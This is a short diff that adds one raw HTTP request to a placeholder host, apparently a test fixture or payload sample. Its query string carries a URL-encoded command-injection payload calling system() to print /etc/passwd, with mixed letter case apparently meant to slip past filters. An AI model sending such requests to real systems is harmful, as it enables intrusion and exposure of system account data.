@@ -1,0 +1,4 @@
+GET /a?q=c%3DSyStEm('CaT%20/eTc/PaSsWd') HTTP/1.1
+Host: demo.example.com
+Connection: close
+
